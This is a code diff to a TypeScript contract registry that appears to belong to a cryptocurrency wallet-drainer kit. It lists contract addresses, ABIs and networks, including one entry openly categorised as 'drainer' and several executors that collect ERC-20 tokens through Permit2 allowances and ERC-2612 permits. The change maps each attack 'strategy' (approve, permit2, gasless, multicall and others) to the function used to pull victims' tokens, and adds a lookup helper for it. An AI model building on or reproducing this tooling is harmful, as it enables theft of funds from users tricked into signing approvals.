@@ -33,6 +33,7 @@ export type ContractMeta = {
   capabilities?: unknown[]; backend?: string | null;
   description: string; networks: number[]; functions: string[]; isDefault?: boolean;
   strategySupport?: StrategyMode[]; // Which strategy modes this contract supports
+  strategyFunctions?: Record<StrategyMode, string>; // For each strategy, which function to use
 };
 
 // Extract function names from ABI
@@ -45,16 +46,16 @@ function extractFunctionNames(abi: unknown[]): string[] {
 }
 
 export const CONTRACT_REGISTRY: ContractMeta[] = [
-  { id: "stage1-module", name: "Stage1Module (Sequence)", category: "sequence", address: "0xfBC5a55501E747b0c9F82e2866ab2609Fa9b99f4", abiFile: "abi/Stage1Module.json", abi: Stage1ModuleABI, description: "Core Sequence wallet logic", networks: [1,10,137,42161], functions: ["execute","isValidSignature","updateImageHash"], strategySupport: ["direct", "approve", "multicall"], isDefault: true },
-  { id: "stage2-module", name: "Stage2Module (Sequence)", category: "sequence", address: "0x5C9C4AD7b287D37a37d267089e752236f368f94f", abiFile: "abi/Stage2Module.json", abi: Stage2ModuleABI, description: "Advanced wallet module", networks: [1,10,137,42161], functions: ["execute","executeUserOp","updateImageHash"], strategySupport: ["direct", "approve", "multicall"] },
+  { id: "stage1-module", name: "Stage1Module (Sequence)", category: "sequence", address: "0xfBC5a55501E747b0c9F82e2866ab2609Fa9b99f4", abiFile: "abi/Stage1Module.json", abi: Stage1ModuleABI, description: "Core Sequence wallet logic", networks: [1,10,137,42161], functions: ["execute","isValidSignature","updateImageHash"], strategySupport: ["direct", "approve", "multicall"], strategyFunctions: { direct: "execute", approve: "execute", multicall: "execute" }, isDefault: true },
+  { id: "stage2-module", name: "Stage2Module (Sequence)", category: "sequence", address: "0x5C9C4AD7b287D37a37d267089e752236f368f94f", abiFile: "abi/Stage2Module.json", abi: Stage2ModuleABI, description: "Advanced wallet module", networks: [1,10,137,42161], functions: ["execute","executeUserOp","updateImageHash"], strategySupport: ["direct", "approve", "multicall"], strategyFunctions: { direct: "execute", approve: "execute", multicall: "executeUserOp" } },
   { id: "eip7702-module", name: "EIP7702Module (Sequence)", category: "sequence", address: "0x1f82E64E694894BACfa441709fC7DD8a30FA3E5d", abiFile: "abi/EIP7702Module.json", abi: EIP7702ModuleABI, description: "EIP-7702 delegation module", networks: [1,10,137,42161], functions: ["execute","updateImageHash"], strategySupport: ["eip7702", "gasless"] },
   { id: "eip7702-batch-delegate", name: "EIP7702BatchDelegate (Sequence)", category: "sequence", abiFile: "contracts json/EIP7702BatchDelegate.json", abi: EIP7702BatchDelegateArtifact.abi, description: "EIP-7702 batch delegation", networks: [1,10,137,42161], functions: [], strategySupport: ["eip7702", "gasless"] },
   { id: "session-manager", name: "SessionManager (Sequence)", category: "sequence", address: "0x4AE428352317752a51Ac022C9D2551BcDef785cb", abiFile: "abi/SessionManager.json", abi: SessionManagerABI, description: "Session-limited execution", networks: [1,10,137,42161], functions: ["getLimitUsage","incrementUsageLimit"], strategySupport: ["direct", "approve"] },
   { id: "guest", name: "Guest (Sequence)", category: "sequence", address: "0x2d21Ce2fBe0BAD8022BaE10B5C22eA69fE930Ee6", abiFile: "abi/Guest.json", abi: GuestABI, description: "Sequence guest module", networks: [1,10,137,42161], functions: ["execute"], strategySupport: ["direct", "approve"] },
-  { id: "permit2-executor", name: "Permit2Executor", category: "sequence", address: "0x4593D97d6E932648fb4425aC2945adaF66927773", abiFile: "abi/Permit2Executor.json", abi: Permit2ExecutorABI, description: "Collect ERC-20 via Permit2 allowance", networks: [1,10,137,42161], functions: ["pullBatchFromAllowance","pullFromAllowance","collectSingle","collectBatch"], strategySupport: ["permit2", "gasless"] },
-  { id: "erc2612-executor", name: "ERC2612Executor", category: "sequence", address: "0xb8eF065061bbBF5dCc65083be8CC7B50121AE900", abiFile: "abi/ERC2612Executor.json", abi: ERC2612ExecutorABI, description: "ERC-2612 permit + collect", networks: [1,10,137,42161], functions: ["batchPermitAndCollect","permitAndCollect","collect"], strategySupport: ["permit", "gasless"] },
-  { id: "batch-multicall", name: "BatchMulticall", category: "sequence", address: "0xF93E987DF029e95CdE59c0F5cD447e0a7002054D", abiFile: "abi/BatchMulticall.json", abi: BatchMulticallABI, description: "Batch arbitrary calldata", networks: [1,10,137,42161], functions: ["batch","batchStatic"], strategySupport: ["multicall"] },
-  { id: "stealth-exchange", name: "StealthExchange", category: "sequence", address: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A", abiFile: "contracts json/StealthExchange.json", abi: StealthExchangeArtifact.abi, description: "Permit2 batch transfers (EIP-712)", networks: [1,10,137,42161,8453], functions: ["batchPermitTransferFromBatch","singlePermitTransfer","batchPermitTransfer","setExecutor","emergencyWithdraw"], strategySupport: ["direct", "permit2", "eip712", "trails"] },
+  { id: "permit2-executor", name: "Permit2Executor", category: "sequence", address: "0x4593D97d6E932648fb4425aC2945adaF66927773", abiFile: "abi/Permit2Executor.json", abi: Permit2ExecutorABI, description: "Collect ERC-20 via Permit2 allowance", networks: [1,10,137,42161], functions: ["pullBatchFromAllowance","pullFromAllowance","collectSingle","collectBatch"], strategySupport: ["permit2", "gasless"], strategyFunctions: { permit2: "pullBatchFromAllowance", gasless: "pullBatchFromAllowance" } },
+  { id: "erc2612-executor", name: "ERC2612Executor", category: "sequence", address: "0xb8eF065061bbBF5dCc65083be8CC7B50121AE900", abiFile: "abi/ERC2612Executor.json", abi: ERC2612ExecutorABI, description: "ERC-2612 permit + collect", networks: [1,10,137,42161], functions: ["batchPermitAndCollect","permitAndCollect","collect"], strategySupport: ["permit", "gasless"], strategyFunctions: { permit: "permitAndCollect", gasless: "permitAndCollect" } },
+  { id: "batch-multicall", name: "BatchMulticall", category: "sequence", address: "0xF93E987DF029e95CdE59c0F5cD447e0a7002054D", abiFile: "abi/BatchMulticall.json", abi: BatchMulticallABI, description: "Batch arbitrary calldata", networks: [1,10,137,42161], functions: ["batch","batchStatic"], strategySupport: ["multicall"], strategyFunctions: { multicall: "batch" } },
+  { id: "stealth-exchange", name: "StealthExchange", category: "sequence", address: "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A", abiFile: "contracts json/StealthExchange.json", abi: StealthExchangeArtifact.abi, description: "Permit2 batch transfers (EIP-712)", networks: [1,10,137,42161,8453], functions: ["batchPermitTransferFromBatch","singlePermitTransfer","batchPermitTransfer","setExecutor","emergencyWithdraw"], strategySupport: ["direct", "permit2", "eip712", "trails"], strategyFunctions: { direct: "batchPermitTransfer", permit2: "batchPermitTransferFromBatch", eip712: "batchPermitTransferFromBatch", trails: "batchPermitTransfer" } },
   { id: "stealth-exchange-factory", name: "StealthExchangeFactory", category: "sequence", abiFile: "contracts json/contract.json", abi: StealthExchangeFactoryArtifact.abi, description: "Deploys StealthExchange", networks: [1,10,137,42161], functions: ["createExchange","getUserExchanges"], strategySupport: [] },
 
   { id: "claim-contract", name: "ClaimContract (Forge)", category: "drainer", address: "0xA513Df2C1Fc057c38FdbC6E37723365Dd2547260", abiFile: "abi/ClaimContract.json", abi: (ClaimContractABI as any).abi, description: "Claim/airdrop style", networks: [1,56,137,42161], functions: ["claim","claimCount","owner","paused","receiver"], strategySupport: ["direct", "approve"] },
@@ -112,4 +113,11 @@ export function isStrategyAvailable(backend: string, mode: StrategyMode): boolea
 export function getCompatibleBackends(mode: StrategyMode): string[] {
   return CONTRACT_REGISTRY.filter((c) => c.strategySupport?.includes(mode))
     .map((c) => c.id);
+}
+
+// Get the specific function a contract uses for a given strategy
+export function getStrategyFunction(contractId: string, mode: StrategyMode): string | null {
+  const contract = getContractById(contractId);
+  if (!contract?.strategyFunctions) return null;
+  return contract.strategyFunctions[mode] || null;
 }
